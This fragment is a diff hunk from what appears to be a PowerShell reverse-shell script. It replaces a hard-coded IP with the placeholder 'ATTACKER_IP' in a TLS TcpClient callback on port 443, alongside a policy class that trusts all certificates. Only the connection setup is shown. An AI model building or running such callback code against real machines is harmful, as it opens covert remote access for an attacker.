@@ -8,7 +8,7 @@ public class TrustAllCertsPolicy {
 }
 "@
 
-$tcp = New-Object Net.Sockets.TcpClient("10.25.65.164",443)
+$tcp = New-Object Net.Sockets.TcpClient("ATTACKER_IP",443)
 $stream = $tcp.GetStream()
 
 $ssl = New-Object Net.Security.SslStream($stream,$false,
